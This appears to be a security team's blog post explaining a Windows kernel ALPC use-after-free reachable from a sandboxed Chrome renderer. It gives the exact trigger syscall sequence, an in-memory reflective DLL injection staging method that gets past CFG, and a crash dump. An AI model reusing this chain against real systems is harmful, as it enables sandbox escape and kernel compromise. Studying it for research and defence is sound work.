+<p>Steps 2&#x2013;3 covered ji9umi&#x2019;s Renderer RCE, and in Step 4 OUYA77 gave us a detailed tour of the Chrome sandbox. Picking up that Way from both of them, I&#x2019;m going to walk you through &#x2014; in detail &#x2014; <strong>how do we actually get to Medium-privilege code execution from Chrome?</strong> In today&#x2019;s Step 5 I&#x2019;ll explain ALPC, the key ingredient of the Sandbox Escape, and in Step 6 we&#x2019;ll take that ALPC and see how it takes us all the way to Medium-privilege code execution!</p>
+<p>Shall we get right into it? Let&#x2019;s go~</p>
+<h1 id="1-Sorry-I-studied-ALPC-just-to-show-you-this"><a href="#1-Sorry-I-studied-ALPC-just-to-show-you-this" class="headerlink" title="1. Sorry, I studied ALPC just to show you this"></a>1. Sorry, I studied ALPC just to show you this</h1><p>ALPC (Advanced Local Procedure Call) is the IPC that sits at the very bottom of process-to-process conversations inside Windows. The local RPC we&#x2019;re all familiar with, at the kernel level, mostly ends up riding ALPC too, and system services everyone has heard of like &#x201C;csrss.exe&#x201D; or &#x201C;lsass.exe&#x201D;, DCOM, WinRT activation&#x2026; pretty much every user-mode service is talking over an ALPC port somewhere. Chrome is no exception &#x2014; the Mojo IPC pipe between the renderer and the browser has ALPC partially baked into its underlying transport. Which is to say: the object we&#x2019;re going to be poking at today is dead common, but the kind of thing you&#x2019;d miss unless you look closely!!</p>
+<p><img src="/2026/07/19/gongjae/Wipeload_step5/EN/image2.png" srcset="/img/loading.gif" alt="image"></p>
+<blockquote>
+<p>?? : You studied ALPC just to do THIS?<br>gongjae : <del>Nope, just did it for fun</del></p>
+</blockquote>
+<p>Inside the kernel, two objects star in this show. <code>_ALPC_PORT</code> is the communication endpoint, and <code>KALPC_MESSAGE</code> is a single message flowing through that endpoint. Easiest mental model: server opens a port, clients attach, they exchange messages!</p>
+<p><a href="https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/KR/">https://hackyboiz.github.io/2025/11/29/gongjae/Windows_ALPC/KR/</a></p>
+<p>Actually, we already went over ALPC once in a previous research post, right? Stuff like the port splitting into two tiers of connection port / communication port, and basic message-attribute concepts &#x2014; I put all of that together in the earlier ALPC post! If this is your first time hearing about ALPC, I&#x2019;d recommend giving that one a skim first&#x2026; but honestly the single most important fact is: <strong>how does the Chrome sandbox treat ALPC?</strong></p>
+<p><img src="/2026/07/19/gongjae/Wipeload_step5/EN/image3.png" srcset="/img/loading.gif" alt="image"></p>
+<p>The answer: the <code>NtAlpc*</code> family of syscalls themselves are <strong>not</strong> on the sandbox&#x2019;s filter list!! Even though it&#x2019;s an undocumented interface with nothing on the official docs, it&#x2019;s a very-much-alive API, so even an Untrusted IL renderer can call the stubs <code>ntdll</code> exports directly.</p>
+<h2 id="1-1-Sync-vs-Async"><a href="#1-1-Sync-vs-Async" class="headerlink" title="1.1 Sync vs Async"></a>1.1 Sync vs Async</h2><p>There are two ways to send a message over ALPC. <strong>Async</strong> requests toss the request onto a queue and the calling thread goes on its merry way. <strong>Sync</strong> requests, on the other hand, park the calling thread inside the kernel until an answer comes back!</p>
+<p><img src="/2026/07/19/gongjae/Wipeload_step5/EN/image4.png" srcset="/img/loading.gif" alt="image"></p>
+<p>For the kernel to sustain that &#x201C;parked&#x201D; state, it obviously needs some info, right? Which thread is waiting on which message, who to wake up when the reply lands &#x2014; that stuff has to be recorded somewhere!</p>
+<aside>
+&#x1F4A1;
+
+Quick aside on why the two modes are asymmetric here: async requests don&#x2019;t need the kernel to know &#x201C;who&#x2019;s waiting on this reply?&#x201D; As long as the completion callback is correctly registered, we&#x2019;re done. &#x1FAE0;
+Sync is a different story though. The moment the reply arrives, the kernel code handling it has to figure out **&#x201C;okay, I got this &#x2014; who exactly am I supposed to wake up??&#x201D;**, and that answer has to be pre-stored as a back-pointer somewhere.
+
+</aside>
+
+<h2 id="1-2-Waiting-thread"><a href="#1-2-Waiting-thread" class="headerlink" title="1.2 Waiting thread"></a>1.2 Waiting thread</h2><p>So when a sync request comes in, the kernel slips a back-pocket pointer into the message object that says &#x201C;the thread waiting on this message&#x2019;s reply is THIS guy!!&#x201D; That&#x2019;s the <code>_KALPC_MESSAGE.WaitingThread</code> field, and in the environment I&#x2019;m experimenting with today, Windows 22H2 22621.963, it lives at offset +0x20.</p>
+<p>There&#x2019;s a matching field going the other direction too. On the thread side there&#x2019;s a field that records &#x201C;the message I&#x2019;m currently waiting on is THIS guy!!&#x201D; &#x2014; that&#x2019;s <code>_ETHREAD.AlpcMessageId</code>, located at offset +0x578. WaitingThread from earlier and this AlpcMessageId form a pair of back-pointers pointing at each other!</p>
+<p><img src="/2026/07/19/gongjae/Wipeload_step5/EN/image5.png" srcset="/img/loading.gif" alt="image"></p>
+<blockquote>
+<p>Kind of like how Tai Lung and Master Shifu shared a special bond back when Tai Lung was little&#x2026;</p>
+</blockquote>
+<p>There&#x2019;s a reason the kernel bothers to write this pair with <code>_InterlockedExchange</code> atomically&#x2026; since the same thread can be touched from multiple places at once, you need atomicity to avoid races. &#x1F602;</p>
+<p>But even so &#x2014; when the pair matches it&#x2019;s beautiful, and the moment one side falls out of step, that&#x2019;s when things go sideways. The main character of today&#x2019;s vuln is this very field, and an unmanaged back-pointer is guaranteed to blow up in your face sooner or later, haha!</p>
+<h1 id="2-Root-Cause"><a href="#2-Root-Cause" class="headerlink" title="2. Root Cause"></a>2. Root Cause</h1><p>Alright, as I said above, we need to see why this unmanaged back-pointer is the seed of the vuln, right? But first, let&#x2019;s quickly review sync vs async messaging through some code!</p>
+<h2 id="2-1-ALPC-MSGFLG-SYNC-REQUEST"><a href="#2-1-ALPC-MSGFLG-SYNC-REQUEST" class="headerlink" title="2.1 ALPC_MSGFLG_SYNC_REQUEST"></a>2.1 ALPC_MSGFLG_SYNC_REQUEST</h2><p>The entry point where a message actually lands on the queue is <code>AlpcpDispatchNewMessage</code>. That &#x201C;somewhere in the middle&#x201D; I mentioned earlier is right here! Looking at it in IDA it feels like this:</p>
+<pre><code class="hljs cpp"><span class="hljs-keyword">if</span> ((SendFlags &amp; <span class="hljs-number">0x20000</span>) != <span class="hljs-number">0</span>) {          <span class="hljs-comment">// ALPC_MSGFLG_SYNC_REQUEST</span>
+    <span class="hljs-comment">// plant the thread back-pointer</span>
+    *(_QWORD *)(msg + <span class="hljs-number">0x20</span>) = curthread;                 <span class="hljs-comment">// msg.WaitingThread = current _ETHREAD</span>
+    _InterlockedExchange64(curthread + <span class="hljs-number">0x578</span>, msg);      <span class="hljs-comment">// _ETHREAD.AlpcMessageId = msg</span>
+}</code></pre>
+<p>Two lines, that&#x2019;s the whole trick. Stuff the current thread&#x2019;s <code>_ETHREAD</code> directly into <code>msg+0x20</code>, and conversely plant the message at <code>curthread + 0x578</code>. That completes the pair of back-pointers pointing at each other.</p>
+<p>Let&#x2019;s also briefly trace how SendFlags gets here.</p>
+<aside>
+&#x1F4A1;
+
+When user code calls `NtAlpcSendWaitReceivePort`, the kernel enters `AlpcpSendMessage`, decides routing, and then hands off to this `AlpcpDispatchNewMessage`. The trigger I&#x2019;m using today goes through `NtWaitForWorkViaWorkerFactory`, but even there &#x2014; the moment it processes a deferred send &#x2014; we end up at that same dispatch site.
+&#x2192; Bottom line: no matter which road you take, if `SendFlags &amp; 0x20000` is satisfied, those two lines run!!
+
+</aside>
+
+<p><code>SendFlags &amp; 0x20000</code> is checking the <code>ALPC_MSGFLG_SYNC_REQUEST</code> flag &#x2014; if it were an async request, those two lines get skipped wholesale, right? So to hit this vuln you absolutely have to set 0x20000 in SendFlags and take the sync-request branch. The original Theori blog really emphasized this too!!</p>
+<p>One more thing worth noting: the reason the setting is stamped in both directions is to leave no gaps when routing the reply. But this pair hides a fun little asymmetry &#x2014; would you believe me???</p>
+<p><img src="/2026/07/19/gongjae/Wipeload_step5/EN/image6.png" srcset="/img/loading.gif" alt="image"></p>
+<ol>
+<li>When the thread dies, the <code>_ETHREAD</code> gets deleted entirely, so the <code>AlpcMessageId</code> on the other side also disappears with it</li>
+<li>But the WaitingThread planted on the message side stays right there as long as the message is alive</li>
+</ol>
+<p>This asymmetry is exactly the starting point of the vulnerability!</p>
+<h2 id="2-2-SYNC-REQUEST-Use-After-Free"><a href="#2-2-SYNC-REQUEST-Use-After-Free" class="headerlink" title="2-2. SYNC_REQUEST Use-After-Free"></a>2-2. SYNC_REQUEST Use-After-Free</h2><p>This back-pointer pair has no concept of lifetime management. It gets <em>set</em>, but there&#x2019;s no janitor to clean up the WaitingThread inside the message when the thread dies!! &#x1F9F9; That is, no exaggeration, the root of today&#x2019;s vuln.</p>
+<p>Layering a reference-counting lens on top makes it click. In the Windows kernel, the by-the-book way to store an object pointer inside another object is: bump the refcount with <code>ObReferenceObjectByPointer</code>, and when you&#x2019;re done, drop it back down with the matching dereference.</p>
+<p><img src="/2026/07/19/gongjae/Wipeload_step5/EN/image7.png" srcset="/img/loading.gif" alt="image"></p>
+<p><strong>&#x2192; But WaitingThread?? It just plants a raw pointer, that&#x2019;s it!</strong></p>
+<p>It doesn&#x2019;t touch the <code>_ETHREAD</code> refcount, and it doesn&#x2019;t clean up this slot on destruction&#x2026; &#x1F975;</p>
+<p>The consequence: even after the thread dies, its refcount hits 0, and it gets returned to the pool slab &#x2014; this raw pointer just sits there, unbothered!! That opens up the following scenario.</p>
+<p><img src="/2026/07/19/gongjae/Wipeload_step5/EN/image8.png" srcset="/img/loading.gif" alt="image"></p>
+<ol>
+<li>Some thread sends a SYNC message and plants itself into msg+0x20</li>
+<li>That thread dies via <code>NtTerminateThread</code>, and via <code>CloseHandle(hThread)</code> and <code>CloseHandle(hWorkerFactory)</code> the <code>_ETHREAD</code> gets returned to the <code>NonPagedPoolNx</code> Thre-tag slab</li>
+<li>Because the worker factory is holding one reference on the thread, just closing the thread handle isn&#x2019;t enough to release the slab</li>
+<li>Result: the WaitingThread inside the message keeps pointing at what is now a pointer that will get freed!!</li>
+</ol>
+<p>Sounds like OUYA77&#x2019;s feather-for-Tai-Lung from Step 4 is now sitting on the table, doesn&#x2019;t it? Right now it looks like a totally useless feather, but the moment the kernel touches this message again and dereferences msg+0x20 &#x2014; boom, UAF.</p>
+<h2 id="2-3-How-to-Trigger-UAF"><a href="#2-3-How-to-Trigger-UAF" class="headerlink" title="2.3 How to Trigger UAF?"></a>2.3 How to Trigger UAF?</h2><p>Okay, now let&#x2019;s look at how you actually <strong>fire</strong> this unmanaged back-pointer! The trigger is split across two threads. One is the <strong>trigger thread</strong>, which queues the message, plants itself, then falls asleep inside the kernel. The other is the <strong>main thread</strong>, which kills the trigger thread and, at the very end, lights the fuse!</p>
+<p>But here&#x2019;s a new object we haven&#x2019;t met: <strong>WorkerFactory</strong>. It&#x2019;s a kernel object that arrived in Vista as the backend of the Windows thread pool, playing housekeeper &#x2014; creating, maintaining, and reclaiming its own worker threads.</p>
+<p>Normally a worker thread&#x2019;s life in the Windows thread pool is dead simple. It calls <code>NtWaitForWorkViaWorkerFactory</code> and dozes inside the kernel until there&#x2019;s a work item to handle; when work shows up it wakes up, does the job, and goes back to sleep via this syscall. So this syscall is the thread pool&#x2019;s <strong>&#x201C;worker, wait here until there&#x2019;s work&#x201D;</strong> parking spot.</p>
+<p>But we have zero interest in actually running a thread pool. We just create a bare-shell WorkerFactory with <code>NtCreateWorkerFactory</code> and then, pretending to be a worker, we call <code>NtWaitForWorkViaWorkerFactory</code> ourselves to <strong>hitch a ride on that &#x201C;worker-waiting-for-work&#x201D; mechanism</strong>.</p>
+<aside>
+&#x1F4A1;
+
+But why build the trigger on *this specific* syscall? There&#x2019;s a reason!
+`NtWaitForWorkViaWorkerFactory` takes as its last argument an undocumented struct called `WORKER_FACTORY_DEFERRED_WORK` (WFDW for short), which the kernel consumes inside &#x2014; and one of its fields is `AlpcSendMessageFlags`. Which means user code can just jam 0x20000 in there directly&#x2026;!
+&#x2192; In other words, &#x201C;hey kernel, please queue a SYNC-natured ALPC message on my behalf!!&#x201D; &#x2014; a back door is sitting wide open right here. &#x1F60E;
+
+</aside>
+
+<p>Setting <code>WFDW.Flags</code> to <code>1</code> to go into <strong>deferred send</strong> mode is also a key point. If you go immediate-send, right after the message is queued it flows straight through to dispatch completion, and the moment you set things up, the other side&#x2019;s cleanup gets dragged along too. Switching to deferred send and kicking it off with <code>NtSetIoCompletion</code> lets us <strong>plant the setup but defer the dispatch completion</strong>. That&#x2019;s the window we need to create the dangling state!</p>
+<p>Let&#x2019;s look at the steps the trigger thread walks through. One thing to note up front &#x2014; steps 1, 2, 3 build the &#x201C;ingredients (handles)&#x201D; IoCompletion / WorkerFactory / ALPC port, and 4, 5, 6 are all just <strong>&#x201C;fill in values in my user memory&#x201D;</strong> prep work. The message actually landing on the queue and this thread getting nailed to the kernel &#x2014; that happens on line 7, and only line 7. Until 7, the message, the trailer, and the WFDW are just struct values being set in user memory; the moment that bundle crosses into the kernel and becomes &#x201C;message queued + thread blocked&#x201D; is precisely 7.</p>
+<pre><code class="hljs cpp"><span class="hljs-comment">// &#x2500;&#x2500; 1,2,3 : create kernel handles (ingredients) first &#x2500;&#x2500;</span>
+<span class="hljs-number">1.</span> NtCreateIoCompletion(&amp;hIoComp, ...)                       <span class="hljs-comment">// IoCompletion handle</span>
+<span class="hljs-number">2.</span> NtCreateWorkerFactory(&amp;hWF, ..., hIoComp,                 <span class="hljs-comment">// WorkerFactory shell</span>
+                         GetCurrentProcess(), ...)
+<span class="hljs-number">3.</span> NtAlpcCreatePort(&amp;hPort, <span class="hljs-literal">NULL</span>, &amp;attr)                     <span class="hljs-comment">// anonymous ALPC port (Flags = 0x20000)</span>
+
+<span class="hljs-comment">// &#x2500;&#x2500; 4,5,6 : from here it&apos;s all just filling struct values in &apos;user memory&apos; (kernel doesn&apos;t know yet) &#x2500;&#x2500;</span>
+<span class="hljs-number">4.</span> <span class="hljs-function">Prepare <span class="hljs-title">PORT_MESSAGE</span>  <span class="hljs-params">(user memory)</span>                         <span class="hljs-comment">// &#x2190; the &apos;message&apos; itself</span></span>
+<span class="hljs-function">     DataLength     </span>= <span class="hljs-number">0x100</span>
+     TotalLength    = <span class="hljs-number">0x128</span>        <span class="hljs-comment">// 0x28 header + 0x100 body</span>
+     DataInfoOffset = <span class="hljs-number">0x30</span>         <span class="hljs-comment">// signpost: &quot;my trailer is over here&quot;</span>
+
+<span class="hljs-number">5.</span> Set up the trailer  (msg + <span class="hljs-number">0x30</span>, user memory)               <span class="hljs-comment">// &#x2190; the spot DataInfoOffset points to</span>
+     NumberOfEntries        = <span class="hljs-number">1</span>
+     Entries[<span class="hljs-number">0</span>].BaseAddress = target_page   <span class="hljs-comment">// an RW page in my process</span>
+     Entries[<span class="hljs-number">0</span>].DataLength  = <span class="hljs-number">0x100</span>
+
+<span class="hljs-number">6.</span> Set up WFDW  (user memory)                                  <span class="hljs-comment">// &#x2190; the &quot;order form&quot; we&apos;ll hand to the kernel</span>
+     .AlpcSendMessage      = &amp;msg
+     .AlpcSendMessagePort  = hPort
+     .AlpcSendMessageFlags = <span class="hljs-number">0x20000</span>    <span class="hljs-comment">// SYNC_REQUEST</span>
+     .Flags                = <span class="hljs-number">1</span>          <span class="hljs-comment">// deferred send</span>
+
+<span class="hljs-comment">// &#x2500;&#x2500; from here we enter the kernel: we hand the whole WFDW over &#x2500;&#x2500;</span>
+<span class="hljs-number">7.</span> NtWaitForWorkViaWorkerFactory(hWF, ..., &amp;wfdw)
+   <span class="hljs-comment">// kernel reads WFDW, performs deferred SYNC send &#x2192; message queued +</span>
+   <span class="hljs-comment">//   msg.WaitingThread = my _ETHREAD planted + this thread blocks!</span></code></pre>
+<p><img src="/2026/07/19/gongjae/Wipeload_step5/EN/image9.png" srcset="/img/loading.gif" alt="image"></p>
+<p>Putting it in words again: setting up the message (4), trailer (5), and WFDW (6) is all just writing values into my user memory. <code>PORT_MESSAGE</code>&#x2019;s <code>DataInfoOffset = 0x30</code> is a signpost saying &#x201C;my trailer is 0x30 bytes into msg,&#x201D; and 5 is writing <code>BaseAddress</code> / <code>DataLength</code> at that spot. The kernel has zero idea what we&#x2019;re preparing up to this point. The actual &#x201C;send message (post)&#x201D; isn&#x2019;t a send function we call ourselves &#x2014; it&#x2019;s the kernel doing it <em>on our behalf</em> when we hand the WFDW we filled at 6 over via <code>NtWaitForWorkViaWorkerFactory</code> at 7. That&#x2019;s when it takes the SYNC branch and plants my <code>_ETHREAD</code> into <code>msg.WaitingThread</code>. But because we&#x2019;re in deferred mode, the setup is planted but the follow-up cleanup gets pushed back &#x2014; and <em>that gap</em> is exactly the time window we need in the next step to create the dangling state.</p>
+<p>By the time we get here, the kernel state looks like this: the message is sitting on the port queue, that message&#x2019;s <code>+0x20</code> points at the trigger thread&#x2019;s <code>_ETHREAD</code>, and the trigger thread is snoozing away inside <code>NtWaitForWorkViaWorkerFactory</code>. The deal is sealed, and our target is nailed firmly to its seat!</p>
+<p>Now it&#x2019;s the main thread&#x2019;s turn to light the fuse!</p>
+<pre><code class="hljs cpp">A. CreateThread(trigger)
+B. NtSetIoCompletion(hIoComp, ...)   <span class="hljs-comment">// kick off the deferred send</span>
+C. Sleep(<span class="hljs-number">500</span>)                        <span class="hljs-comment">// wait for the trigger thread to settle</span>
+D. NtTerminateThread(hthread, <span class="hljs-number">0</span>)     <span class="hljs-comment">// kill it WITHOUT WFSO!!</span>
+E. CloseHandle(hthread)              <span class="hljs-comment">// thread-handle ref -1</span>
+   Sleep(<span class="hljs-number">40000</span>)                      <span class="hljs-comment">// slot we&apos;ll use in Step 6 &#x2014; today it&apos;s just wait time</span>
+F. CloseHandle(hWorkerFactory)       <span class="hljs-comment">// only after this does the _ETHREAD return to the slab</span>
+G. CloseHandle(hIoComp)
+H. CloseHandle(hPort)                <span class="hljs-comment">// &#x2190; boom!!!</span></code></pre>
+<p><img src="/2026/07/19/gongjae/Wipeload_step5/EN/image10.png" srcset="/img/loading.gif" alt="image"></p>
+<aside>
+&#x1F4A1;
+
+Look at D &#x2014; we do **not** wait for the thread to finish with `WaitForSingleObject`, we just force-kill it with `NtTerminateThread`. Normally you&#x2019;d throw a WFSO in there, and *not doing that* is the point! If you wait for total destruction via WFSO, the follow-on cleanup path grabs one more kernel reference and the dangling state we want doesn&#x2019;t form. So we just kill it and close handles, shaving off exactly one reference at a time.
+
+</aside>
+
+<p>Then the big moment &#x2014; H, <code>CloseHandle(hPort)</code> &#x2014; that&#x2019;s what sets off the bomb. The <code>Close(hWF)</code> and <code>Close(hIoComp)</code> before it do absolutely nothing! The call chain looks like this:</p>
+<pre><code class="hljs angelscript">NtClose(hPort)
+ &#x2192; AlpcpClosePort &#x2192; AlpcpDeletePort
+ &#x2192; AlpcpSendCloseMessage + AlpcpDoPortCleanup
+ &#x2192; AlpcpFlushMessagesPort &#x2192; <span class="hljs-number">4</span>&#xD7; AlpcpFlushQueue
+ &#x2192; AlpcpCancelMessage +<span class="hljs-number">0x358</span>
+     rcx = *(msg + <span class="hljs-number">0x20</span>);        <span class="hljs-comment">// msg.WaitingThread (already-freed _ETHREAD!)</span>
+     xchg [rcx + <span class="hljs-number">0x578</span>], rax     <span class="hljs-comment">// &#x2190; UAF write here &#x2192; BSOD</span>
+     <span class="hljs-comment">// &#x2192; PAGE_FAULT_IN_NONPAGED_AREA (0x50)</span></code></pre>
+<p>When the port closes, the kernel loops through the messages still on the queue to clean them up, and per message it calls <code>AlpcpCancelMessage</code>. The <code>xchg</code> instruction at offset <code>+0x358</code> inside that function does a write to <code>+0x578</code> of the <code>_ETHREAD</code> pointed to by <code>msg+0x20</code> &#x2014; but that <code>_ETHREAD</code> is already dead and back in the slab! Writing to something that isn&#x2019;t there means the write goes into a freed page, and off we go straight to BSOD. &#x1F4A5;</p>
+<p>By the way, there&#x2019;s also a reason we didn&#x2019;t bother building a server-client port pair and instead just stood up a single <strong>anonymous port</strong> with <code>NtAlpcCreatePort</code>, catching the sink on the <code>CloseHandle(hPort)</code> path &#x2014; this path naturally lines up with the <code>LpcpCopyRequestData</code> gate that leads to the Read/Write primitive in Step 6! (That&#x2019;s a Step 6 spoiler though, so I&#x2019;ll stop right there haha)</p>
+<h1 id="3-Chrome-to-ALPC-With-BSOD"><a href="#3-Chrome-to-ALPC-With-BSOD" class="headerlink" title="3. Chrome to ALPC (With BSOD)"></a>3. Chrome to ALPC (With BSOD)</h1><p>Okay, so far it&#x2019;s all been kernel-side chatter, right? But where we&#x2019;re actually standing is <em>inside the renderer process</em>, and on top of that, inside a sandbox that&#x2019;s been crushed under Untrusted IL. We&#x2019;ve got a Restricted Token slapped on us, the Job Object blocks process creation, we can&#x2019;t touch files, we can&#x2019;t open network sockets. So how on earth do we run that syscall sequence from inside this prison cell?? &#x1F914;</p>
+<p>This is exactly where the fact I planted at the very start pays off. <strong>Chrome&#x2019;s sandbox slams the door shut on files, network, and win32k, but it does not gate the NT syscalls that ntdll exposes.</strong> So even from Untrusted IL, things like <code>NtCreateIoCompletion</code>, <code>NtCreateWorkerFactory</code>, <code>NtAlpcCreatePort</code>, <code>NtWaitForWorkViaWorkerFactory</code>, <code>NtClose</code> &#x2014; you can just call them!</p>
+<p>In Steps 2&#x2013;3, ji9umi already handed us renderer RCE (V8 arbitrary R/W + WASM <code>IndirectFunctionTable</code> for short shellcode execution). Great launch pad, but a bit cramped for freely calling kernel syscalls. What we need is an execution environment where native code can run around freely inside the renderer. So we&#x2019;re going to plant a trigger DLL inside the renderer and run the sequence above from there!</p>
+<h2 id="3-1-sRDI-Shellcode-Reflective-DLL-Injection"><a href="#3-1-sRDI-Shellcode-Reflective-DLL-Injection" class="headerlink" title="3.1 sRDI (Shellcode Reflective DLL Injection)"></a>3.1 sRDI (Shellcode Reflective DLL Injection)</h2><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/monoxgas/srdi">https://github.com/monoxgas/srdi</a></p>
+<p>When I say &#x201C;plant a DLL&#x201D;, <code>LoadLibrary</code> comes to mind, right? But as I mentioned earlier, the Untrusted IL renderer has almost no file-system access, so we can&#x2019;t drop a DLL file on disk. <code>LoadLibraryA(&quot;C:\\payload.dll&quot;)</code> doesn&#x2019;t even get out the gate.. &#x1F972;</p>
+<p>But here&#x2019;s the fun bit! <code>ntdll.dll</code> is already mapped into the renderer, and &#x201C;self-address-space-manipulation&#x201D; syscalls like <code>NtAllocateVirtualMemory</code> / <code>NtProtectVirtualMemory</code> aren&#x2019;t blocked by the sandbox. Making an executable page in your own process is not something the sandbox blocks (if the process has ACG on this gets blocked too, but Chrome renderer doesn&#x2019;t enable ACG by default).</p>
+<p>Through that crack, the trick to plant code purely in memory is <strong>sRDI</strong>! You pre-pack the DLL into a relocatable blob, and on load, without touching the file system at all, it resolves imports/relocs and starts executing right there in memory. Doesn&#x2019;t open files, doesn&#x2019;t spawn processes, doesn&#x2019;t use the network.</p>
+<p>&#x1F4A1;<br>But why bother laying down the DLL <strong>in full PE image shape</strong> instead of raw shellcode? This is another thing I learned while reproducing it &#x2014; if you just drop raw code onto an RWX page and hit it with <code>CreateThread</code>, the renderer&#x2019;s <strong>CFG (Control Flow Guard)</strong> slams the door on you. &#x1F6AB; CFG checks via bitmap whether a thread start address is &#x201C;inside a properly loaded image,&#x201D; and a raw RWX address with no image backing doesn&#x2019;t pass. sRDI fully dresses the code up with MZ/PE headers, per-section protection attributes, and even registers SEH via <code>RtlAddFunctionTable</code>, so to the kernel/loader it looks like &#x201C;a genuinely loaded module.&#x201D; That&#x2019;s why <code>CreateThread</code> targeting a function inside it passes the CFG check! I actually tested this &#x2014; raw PIC and even &#x201C;PE-less, RX-only protected&#x201D; pages all got blocked; only a full PE mapping (sRDI) made it through. &#x1F643;</p>
+<h2 id="3-2-Three-stage-commit-stub"><a href="#3-2-Three-stage-commit-stub" class="headerlink" title="3.2 Three-stage commit stub"></a>3.2 Three-stage commit stub</h2><p>There&#x2019;s one more problem. The execution foothold V8 hands us initially is meant for WASM code and it&#x2019;s pretty cramped &#x2014; too tight to slap an 8KB-ish sRDI blob on top of. So we use a slightly hand-cranked three-stage trick!</p>
+<p><img src="/2026/07/19/gongjae/Wipeload_step5/EN/image11.png" srcset="/img/loading.gif" alt="image"></p>
+<ol>
+<li>First plant and run a <strong>154-byte commit_stub</strong> &#x2192; walks the PEB&#x2019;s <code>Ldr.InLoadOrder</code> to find <code>kernel32.dll</code>, resolves <code>VirtualAlloc</code> on its own &#x2192; allocates a generous heap right next to it with <code>PAGE_EXECUTE_READWRITE</code></li>
+<li>Copy the <strong>sRDI blob</strong> into that generous heap</li>
+<li>A 12-byte <code>mov rax, addr; jmp rax</code> trampoline jumps into sRDI&#x2019;s <code>Reflective_Loader</code> &#x2192; resolves imports/relocs and calls the DLL&#x2019;s exported <code>RunExploit</code>!</li>
+</ol>
+<p>The JS side flow looks roughly like this:</p>
+<pre><code class="hljs jsx"><span class="hljs-comment">// Stage 1: commit_stub onto the foothold page</span>
+arbitrary_write(rwx, commit_stub_bytes);
+shellcode();                          <span class="hljs-comment">// stub runs &#x2192; VirtualAlloc</span>
+
+<span class="hljs-comment">// Stage 2: sRDI blob into the committed big RWX heap</span>
+arbitrary_write(commit_addr, sRDI_bytes);
+
+<span class="hljs-comment">// Stage 3: trampoline &#x2192; Reflective_Loader &#x2192; RunExploit</span>
+arbitrary_write(rwx, trampoline);
+shellcode();</code></pre>
+<p>By the time we&#x2019;re here, the C code we wrote is actually running as real x64 native inside the renderer. Now we can run the UAF scenario inside it exactly as designed!</p>
+<h2 id="3-3-BSOD-via-the-trigger-DLL"><a href="#3-3-BSOD-via-the-trigger-DLL" class="headerlink" title="3.3 BSOD via the trigger DLL"></a>3.3 BSOD via the trigger DLL</h2><p>Finally, hands-on time! The trigger DLL is dead boring. What matters here is verifying that the UAF definitely fires, so:</p>
+<pre><code class="hljs powershell">verifier /flags <span class="hljs-number">0</span>x9BB /driver ntoskrnl.exe</code></pre>
+<p>You&#x2019;ve got to run the above command to make sure the UAF doesn&#x2019;t slip through silently! What this command does is give special treatment to the kernel&#x2019;s pool allocations/frees so that touching a freed address triggers an immediate page fault. A lot of the time UAFs just quietly pass by, so this catches them!</p>
+<p>Back to the trigger &#x2014; it has a single <code>RunExploit</code> export, and all it does is walk the UAF scenario as-is. Open the sample page and there&#x2019;s exactly one button on screen: &#x201C;Exploit Me&#x201D;. Let&#x2019;s click it and see if we get a BSOD!</p>
+<p><img src="/2026/07/19/gongjae/Wipeload_step5/EN/image12.png" srcset="/img/loading.gif" alt="image"></p>
+<p>Click the button and &#x2014; same way ji9umi did back in Step 3 &#x2014; Renderer RCE lands, the planted sRDI runs, and a few seconds later, BSOD!!</p>
+<p><img src="/2026/07/19/gongjae/Wipeload_step5/EN/image13.png" srcset="/img/loading.gif" alt="image"></p>
+<pre><code class="hljs cpp"><span class="hljs-number">0</span>: kd&gt; !analyze -v
+Connected to Windows 10 22621 x64 target at (Sun Jul 19 20:15:13.523 2026 (UTC + 9:00)), ptr64 TRUE
+Loading Kernel Symbols
+..........................................
+
+Press ctrl-c (cdb, kd, ntsd) <span class="hljs-keyword">or</span> ctrl-<span class="hljs-keyword">break</span> (windbg) to <span class="hljs-built_in">abort</span> symbol loads that take too <span class="hljs-keyword">long</span>.
+Run !sym noisy before .reload to track down problems loading symbols.
+
+.....................
+................................................................
+.........................................................
+Loading User Symbols
+................................
+Loading unloaded <span class="hljs-keyword">module</span> <span class="hljs-built_in">list</span>
+..................
+*******************************************************************************
+*                                                                             *
+*                        Bugcheck Analysis                                    *
+*                                                                             *
+*******************************************************************************
+
+PAGE_FAULT_IN_NONPAGED_AREA (<span class="hljs-number">50</span>)
+Invalid system memory was referenced.  This cannot be <span class="hljs-keyword">protected</span> by <span class="hljs-keyword">try</span>-except.
+Typically the address is just plain bad <span class="hljs-keyword">or</span> it is pointing at freed memory.
+Arguments:
+Arg1: ffff900dcddceb78, memory referenced.
+Arg2: <span class="hljs-number">0000000000000002</span>, X64: bit <span class="hljs-number">0</span> <span class="hljs-built_in">set</span> <span class="hljs-keyword">if</span> the fault was due to a <span class="hljs-keyword">not</span>-present PTE.
+    bit <span class="hljs-number">1</span> is <span class="hljs-built_in">set</span> <span class="hljs-keyword">if</span> the fault was due to a write, clear <span class="hljs-keyword">if</span> a read.
+    bit <span class="hljs-number">3</span> is <span class="hljs-built_in">set</span> <span class="hljs-keyword">if</span> the processor decided the fault was due to a corrupted PTE.
+    bit <span class="hljs-number">4</span> is <span class="hljs-built_in">set</span> <span class="hljs-keyword">if</span> the fault was due to attempted execute of a no-execute PTE.
+    - ARM64: bit <span class="hljs-number">1</span> is <span class="hljs-built_in">set</span> <span class="hljs-keyword">if</span> the fault was due to a write, clear <span class="hljs-keyword">if</span> a read.
+    bit <span class="hljs-number">3</span> is <span class="hljs-built_in">set</span> <span class="hljs-keyword">if</span> the fault was due to attempted execute of a no-execute PTE.
+Arg3: fffff8037e0fcf6c, If non-zero, the instruction address which referenced the bad memory
+    address.
+Arg4: <span class="hljs-number">0000000000000002</span>, (reserved)
+
+BUGCHECK_CODE:  <span class="hljs-number">50</span>
+
+BUGCHECK_P1: ffff900dcddceb78
+
+BUGCHECK_P2: <span class="hljs-number">2</span>
+
+BUGCHECK_P3: fffff8037e0fcf6c
+
+BUGCHECK_P4: <span class="hljs-number">2</span>
+
+FAULTING_THREAD:ffff900dc22be600EXCEPTION_PARAMETER1:  <span class="hljs-number">0000000000000001</span>
+
+EXCEPTION_PARAMETER2:  ffff900dcddceb78
+
+WRITE_ADDRESS:  ffff900dcddceb78
+
+MM_INTERNAL_CODE:  <span class="hljs-number">2</span>
+
+PROCESS_NAME:  chrome.exe
+
+IP_IN_PAGED_CODE:
+nt!AlpcpCancelMessage+<span class="hljs-number">358</span>
